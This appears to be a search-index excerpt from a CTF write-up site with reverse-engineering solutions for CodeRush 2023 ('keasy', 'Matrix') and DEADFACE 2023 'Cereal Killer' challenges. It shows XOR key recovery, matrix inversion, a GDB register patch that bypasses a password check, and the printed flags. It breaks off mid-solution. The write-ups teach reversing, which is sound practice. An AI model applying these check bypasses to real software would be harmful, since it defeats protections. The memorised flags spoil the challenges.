<p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#hint","title":"Hint","text":"<p>The key does not necessarily have to be comprised of printable ascii characters.</p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#solution_5","title":"Solution","text":"<p>Let's use ghidra to look at the decompiled source.</p> <p></p> <p></p> <p>We can see that the encryption or decryption in place is simple xor cicle. Now the tricky part is there is no clue given as to what we need to xor with to get the original flag or the key. As if one can be obtained, the other unknown can be obtained by simply xoring them. <pre><code>x ^ y = z\nz ^ x = y\ny ^ z = x\n</code></pre> But we have another clue in the shadows though. The flag format is <code>coderush{flag}</code> we can see that the first 8 characters of the flag will be <code>coderush</code>. And also the key is also 8 chars long. So, the first 8 bytes of the encrypted flag i.e, <code>0x271056073f596139</code> can be xored with 'coderush' to get the key and we can then pass the key to the program who will give us the full flag.</p> <p>The following c program will find out the key:</p> <p><pre><code>#include &lt;stdio.h&gt;\n\nvoid solve(char* a, char* b, int len) {\n    for (int i = 0; i &lt; len; i++) {\n        printf(\"%c\",a[i]^b[i]);\n    }\n}\n\nint main() {\n    long bytes = 0x271056073f596139;\n    char known[] = \"coderush\";\n    solve(&amp;bytes,known,8);\n}\n</code></pre> After compiling the program, we run the program and pipe the output to keasy. <pre><code>./sol | ./keasy\n</code></pre> flag: <code>coderush{ru5h_0f_n@p0l30n}</code></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#matrix","title":"Matrix","text":"","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#description_6","title":"Description","text":"<p>Matrix is inevitable. Escape the <code>Matrix</code>.</p> <p>Author: <code>gr007</code></p> <p>matrix</p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#solution_6","title":"Solution","text":"<p>We are given the <code>matrix</code> binary that asks for the one last thing that we have to say. Presumably that has to be the flag in order to escape the matrix. We open the binary in ghidra and look at what the source code looks like:</p> <p>The following part of code is interesting. Because this part is our goal: <pre><code>    f = true;\n    for (j = 0; j &lt; 40; j += 1) {\n        sum = 0;\n        for (k = 0; k &lt; 32; k += 1) {\n            sum += flag[k] * matrix[k + j * 32];\n        }\n        f = f &amp; sum == B[j];\n    }\n    if (f) {\n        puts(\"You sure can escape the matrix\");\n    }\n    else {\n        puts(\"You shall never escape the matrix\");\n    }\n</code></pre></p> <p>So, what is happening is that the flag that is input is being taken as if it were <code>X</code> in a matrix multiplication equation for <code>AX = B</code>. We have <code>B</code> matrix with which the result is being compared with. and also the A matrix with which our flag is being multiplied with. Now, we can simply do <code>X = A^(-1)*B</code> to get X. But there are only 32 characters in the flag but 40 values in <code>B</code> and the matrix <code>A</code> is <code>40x32</code>. We can simply opt out any 8 row from both <code>A</code> and <code>B</code> and get the flag in 32 characters. The following python file calculates the flag: <code>sol.py</code></p> <p>flag: <code>coderush{s0_d0_y0u_l1k3_m4tr1x?}</code></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/deadface/index.html","title":"deadface CTF 2023","text":"","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#cereal-killer-01","title":"Cereal Killer 01","text":"","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#description","title":"Description","text":"<p>Points: 50</p> <p>Created by: <code>TheZeal0t</code></p> <p>How well do you know your DEADFACE hackers? Test your trivia knowledge of our beloved friends at our favorite hactivist collective! We\u2019ll start with bumpyhassan. Even though he grates on TheZeal0t a bit, we find him to be absolutely ADORKABLE!!!</p> <p>Choose one of the binaries below to test your BH trivia knowlege.</p> <p>Enter the flag in the format: flag{Ch33ri0z_R_his_FAV}.</p> <p>Download file</p>","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#solution","title":"Solution","text":"<p>When the binary is run, it asks for bumpyhassan's favorite breakfast cereal.</p> <pre><code>deadface/rev/cereal1 on \ue0a0 master [?] via \ud83d\udc0d v3.11.5\n\u276f ./cereal\nBumpyhassan loves Halloween, so naturally, he LOVES SPOOKY CEREALS!\nHe also happens to be a fan of horror movies from the 1970's to the 1990's.\nWhat is bumpyhassan's favorite breakfast cereal? adsf\nSorry, that is not bumpyhassan's favorite cereal. :(\n</code></pre> <p>The following code (after some cleanup) snippets are the interesting parts from looking at it in ghidra.</p> <pre><code>  p_flag = \"I&amp;_9a%mx_tRmE4D3DmYw_9fbo6rd_aFcRbE,D.D&gt;Y[!]!\\'!q\";\n  puts(\"Bumpyhassan loves Halloween, so naturally, he LOVES SPOOKY CEREALS!\");\n  puts(\"He also happens to be a fan of horror movies from the 1970\\'s to the 1990\\'s.\");\n  printf(\"What is bumpyhassan\\'s favorite breakfast cereal? \");\n  fgets(bf,0xfff,_stdin);\n  for (p_bf = bf; *p_bf != '\\0'; p_bf = p_bf + 1) {\n    *p_bf = *p_bf + '\\a';\n  }\n  *p_bf = '\\0';\n  check = memcmp(&amp;DAT_00012039,bf,14);\n  if (check == 0) {\n    puts(\"You are correct!\");\n    i = flag;\n    for (; *p_flag != '\\0'; p_flag = p_flag + 2) {\n      *i = *p_flag;\n      i = i + 1;\n    }\n    *i = '\\0';\n    printf(\"flag{%s}\\n\",flag);\n  }\n  else {\n    puts(\"Sorry, that is not bumpyhassan\\'s favorite cereal. :( \");\n  }\n</code></pre> <p>It can be easily seen that the flag is built on the stack and printed after the password check is done and our input does not get in the way of our flag being decrypted. That is, we can jump to the code block inside the <code>if</code> check and get the flag decrypted and stored in the stack and even print it. We can also zero out the <code>eax</code> register inside the debugger after the <code>memcmp</code> function is called to have a correct execution and not get any segfault that might arise by directly jumping to the address or if the address is hard to find. I will use this technique whenever I can because it makes reversing with a particular goal in mind easier and it works most of the time without any hiss.</p> <pre><code>[ Legend: Modified register | Code | Heap | Stack | String ]\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 registers \u2500\u2500\u2500\u2500\n$eax   : 0xffffffff\n$ebx   : 0x56558fc4  \u2192  &lt;_GLOBAL_OFFSET_TABLE_+0&gt; int3\n$ecx   : 0x707c794d (\"My|p\"?)\n$edx   : 0xffffbd5a  \u2192  0x00000000\n$esp   : 0xffffbcd0  \u2192  0xffffbd58  \u2192  0x00000000\n$ebp   : 0xffffcd58  \u2192  0x00000000\n$esi   : 0xffffce2c  \u2192  0xffffd044  \u2192  \"XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/groot\"\n$edi   : 0xf7ffcb80  \u2192  0x00000000\n$eip   : 0x565562e9  \u2192  &lt;main+268&gt; test eax, eax\n$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]\n$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500\n0xffffbcd0\u2502+0x0000: 0xffffbd58  \u2192  0x00000000    \u2190 $esp\n0xffffbcd4\u2502+0x0004: 0x00000000\n0xffffbcd8\u2502+0x0008: 0x00000000\n0xffffbcdc\u2502+0x000c: 0x56557008  \u2192  \"I&amp;_9a%mx_tRmE4D3DmYw_9fbo6rd_aFcRbE,D.D&gt;Y[!]!'!q\"\n0xffffbce0\u2502+0x0010: 0x56557039  \u2192   dec ebp\n0xffffbce4\u2502+0x0014: 0x00000000\n0xffffbce8\u2502+0x0018: 0x00000000\n0xffffbcec\u2502+0x001c: 0x00000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:x86:32 \u2500\u2500\u2500\u2500\n   0x565562db &lt;main+254&gt;       push   DWORD PTR [ebp-0x1078]\n   0x565562e1 &lt;main+260&gt;       call   0x56556070 &lt;memcmp@plt&gt;\n   0x565562e6 &lt;main+265&gt;       add    esp, 0x10\n\u25cf\u2192 0x565562e9 &lt;main+268&gt;       test   eax, eax\n   0x565562eb &lt;main+270&gt;       jne    0x56556369 &lt;main+396&gt;\n   0x565562ed &lt;main+272&gt;       sub    esp, 0xc\n   0x565562f0 &lt;main+275&gt;       lea    eax, [ebx-0x1eba]\n   0x565562f6 &lt;main+281&gt;       push   eax\n   0x565562f7 &lt;main+282&gt;       call   0x56556090 &lt;puts@plt&gt;\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500\n[#0] Id 1, Name: \"cereal\", stopped 0x565562e9 in main (), reason: BREAKPOINT\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500\n[#0] 0x565562e9 \u2192 main()\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  set $eax=0\ngef\u27a4  c\nContinuing.\nYou are correct!\nflag{I_am_REDDY_for_FREDDY!!!}\n[Inferior 1 (process 8224) exited normally]\n</code></pre> <p>flag: <code>flag{I_am_REDDY_for_FREDDY!!!}</code></p> <p>Note: Here's the code for reversing and getting the favourite cereal name correct.</p>","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#cereal-killer-02","title":"Cereal Killer 02","text":"","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#description_1","title":"Description","text":"<p>Points: 100</p> <p>Created by: <code>TheZeal0t</code></p> <p>luciafer can be a bit of trouble sometimes, but she can put away the sugary monster cereals with the best of them! She has a favorite, too, and it is based on her favorite monster. See if you can figure it out! Select the binary for your preferred platform.</p> <p>Download file</p>","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#solution_1","title":"Solution","text":"<p>when the binary is run, it asks for Luciafer's favorite breakfast cereal.</p> <pre><code>deadface/rev/cereal_killer_2 on \ue0a0 master [?]\n\u276f ./cereal\nLuciafer also loves Halloween, so she, too, LOVES SPOOKY CEREALS!\nShe has different favorite villain from 70-80's horror movies.\nWhat is Luciafer's favorite breakfast cereal? adfsda\nINCORRECT....: I'm afraid that is not Lucia's current favorite monster cereal.  She is kind of capricious, you know, so it changes often.\n</code></pre> <p>The following code (after some cleanup) snippets are the interesting parts from looking at it in ghidra.</p> <pre><code>  puts(\"Luciafer also loves Halloween, so she, too, LOVES SPOOKY CEREALS!\");\n  puts(\"She has different favorite villain from 70-80\\'s horror movies.\");\n  printf(\"What is Luciafer\\'s favorite breakfast cereal? \");\n  fgets(input,0xfff,_stdin);\n  decode_str(input,63,\n             \"\\b=3?\\x1562GR\\x12\\x1bekHA\\v&lt;\\x14\\x01\\x1d4A[)\\x1b\\x13L&amp;\\x024+\\x16\\x06@\\x17\\r8_\\\"\\x02=\\x 1c\\bK5\\\\Hi\\x0f\\x13L/1\\x11K-\\x1aWIejS\\x1c\"\n             ,correct);\n  iVar1 = strncmp(correct,\"CORRECT!!!!!\",12);\n  if (iVar1 == 0) {\n    puts(correct);\n  }\n  else {\n    printf(\"%s\",\n           \"INCORRECT....: I\\'m afraid that is not Lucia\\'s current favorite monster cereal.  She is  kind of capricious, you know, so it changes often.\\n\"\n          );\n  }\n</code></pre> <pre><code>void decode_str(char *input,int len,char *flag,char *correct)\n\n{\n  int mod;\n  int i;\n\n  mod = 0;\n  i = 0;\n  while (i &lt; len) {\n    correct[i] = flag[i] ^ input[mod];\n    i += 1;\n    mod += 1;\n    if (11 &lt; mod) {\n      mod = 0;\n    }\n  }\n  correct[i] = '\\0';\n  return;\n}\n</code></pre> <p>After analyzing the <code>decode_str</code> function, we can see that we cannot use the trick we used in cereal killer 1 to bypass the check but we can do something pretty interesting instead. The <code>decode_str</code> takes our input and uses it as a key for rotating xor cipher to decode the flag string that has been encoded by the original key. And we can see that the first 12 characters are later compared in the main function with the string <code>CORRECT!!!!!</code>. Now, if we input our favourite cereal as <code>CORRECT!!!!!</code>, we sould get a string comparison with our cereal and <code>CORRECT!!!!!</code> in the main function.</p> <pre><code>[ Legend: Modified register | Code | Heap | Stack | String ]\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 registers \u2500\u2500\u2500\u2500\n$eax   : 0xffffbc2c  \u2192  0x6d61724b (\"Kram\"?)\n$ebx   : 0x56558ff4  \u2192  &lt;_GLOBAL_OFFSET_TABLE_+0&gt; call 0x86559037\n$ecx   : 0x4e\n$edx   : 0x3f\n$esp   : 0xffffac10  \u2192  0xffffbc2c  \u2192  0x6d61724b (\"Kram\"?)\n$ebp   : 0xffffcc38  \u2192  0x00000000\n$esi   : 0xffffcd0c  \u2192  0xffffcf45  \u2192  \"VIMRUNTIME=/usr/share/nvim/runtime\"\n$edi   : 0xf7ffcb80  \u2192  0x00000000\n$eip   : 0x56556301  \u2192  &lt;main+202&gt; call 0x56556080 &lt;strncmp@plt&gt;\n$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]\n$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500\n0xffffac10\u2502+0x0000: 0xffffbc2c  \u2192  0x6d61724b    \u2190 $esp\n0xffffac14\u2502+0x0004: 0x56557187  \u2192  \"CORRECT!!!!!\"\n0xffffac18\u2502+0x0008: 0x00000c (\"\n                               \"?)\n0xffffac1c\u2502+0x000c: 0xffffbc2c  \u2192  0x6d61724b\n0xffffac20\u2502+0x0010: 0x56557008  \u2192  \"INCORRECT....: I'm afraid that is not Lucia's curr[...]\"\n0xffffac24\u2502+0x0014: 0x56557094  \u2192   or BYTE PTR ds:0x36153f33, bh\n0xffffac28\u2502+0x0018: 0x00000000\n0xffffac2c\u2502+0x001c: \"CORRECT!!!!!\\n\"\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:x86:32 \u2500\u2500\u2500\u2500\n   0x565562f9 &lt;main+194&gt;       push   eax\n   0x565562fa &lt;main+195&gt;       lea    eax, [ebp-0x100c]\n   0x56556300 &lt;main+201&gt;       push   eax\n \u2192 0x56556301 &lt;main+202&gt;       call   0x56556080 &lt;strncmp@plt&gt;\n   \u21b3  0x56556080 &lt;strncmp@plt+0&gt;  jmp    DWORD PTR [ebx+0x1c]\n      0x56556086 &lt;strncmp@plt+6&gt;  push   0x20\n      0x5655608b &lt;strncmp@plt+11&gt; jmp    0x56556030\n      0x56556090 &lt;_start+0&gt;       endbr32\n      0x56556094 &lt;_start+4&gt;       xor    ebp, ebp\n      0x56556096 &lt;_start+6&gt;       pop    esi\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 arguments (guessed) \u2500\u2500\u2500\u2500\nstrncmp@plt (\n   [sp + 0x0] = 0xffffbc2c \u2192 0x6d61724b,\n   [sp + 0x4] = 0x56557187 \u2192 \"CORRECT!!!!!\"\n)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500\n[#0] Id 1, Name: \"cereal\", stopped 0x56556301 in main (), reason: BREAKPOINT\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500\n[#0] 0x56556301 \u2192 main()\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  x/s 0xffffbc2c\n0xffffbc2c:     \"KramPuffs3:D(\\a\\023YyWU&lt;\\025`z\\bX\\\\\\036tGw\\1777'a6,{\\020pPx_\\\\j\\024}iHL\\\\\\036}tR\\037\\f;vhD)\\034N\"\ngef\u27a4\n</code></pre> <pre><code>deadface/rev/cereal_killer_2 on \ue0a0 master\n\u276f ./cereal\nLuciafer also loves Halloween, so she, too, LOVES SPOOKY CEREALS!\nShe has different favorite villain from 70-80's horror movies.\nWhat is Luciafer's favorite breakfast cereal? KramPuffs3:D\nCORRECT!!!!! : flag{GramPa-KRAMpus-Is-Comin-For-Da-Bad-Kids!!!}\n</code></pre> <p>flag: <code>flag{GramPa-KRAMpus-Is-Comin-For-Da-Bad-Kids!!!}</code></p>","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#cereal-killer-04","title":"Cereal Killer 04","text":"","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#description_2","title":"Description","text":"<p>Points: 200</p> <p>Created by: <code>TheZeal0t</code></p> <p>lilith is not too old to have a favorite monster / ghoul / daemon / phantasm / poltergeist / creature / extraterrestrial or a favorite sugary breakfast cereal! She also has a favorite programming language (which no one else at DEADFACE likes that much, and they all think she is kinda weird for it). She probably mainly likes it because it was her first language she learned at the age of 9.</p> <p>See if you can crack her program and figure out what her favorite cereal and entity are.</p> <p>Enter the answer as flag{LilithLikesMonsterCereal}.</p> <p>Download file</p>","tags":["rev","deadface"]},{"location":"writeups/2023/deadface/index.html#solution_2","title":"Solution","text":"<p>When the jar file is run, it asks for a password.</p> <pre><code>deadface/rev/cereal_killer_4 on \ue0a0 master [!?] via \u2615 v21\n\u276f java -jar cereal.jar\nlilith's favorite cereal is also her favorite monster / ghoul / daemon / phantasm / poltergeist / creature / extraterrestrial.\nTo get both answers 